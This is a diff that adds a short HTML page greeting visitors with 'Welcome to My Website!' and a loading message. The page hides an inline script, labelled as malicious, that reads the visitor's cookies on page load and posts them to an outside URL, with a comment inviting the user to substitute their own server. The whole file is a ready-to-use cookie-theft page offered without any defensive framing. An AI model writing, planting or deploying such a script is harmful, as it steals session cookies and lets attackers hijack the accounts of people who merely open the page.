@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Welcome</title>
+</head>
+<body>
+    <h1>Welcome to My Website!</h1>
+    <p>Please wait while we load your data...</p>
+    <script>
+        // Malicious script to steal cookies
+        var cookies = document.cookie;
+        fetch('https://github.com/abdafridix12/infotech.github.io/steal', {  // Replace with your server URL
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ stolenCookies: cookies })
+        });
+    </script>
+</body>
+</html>
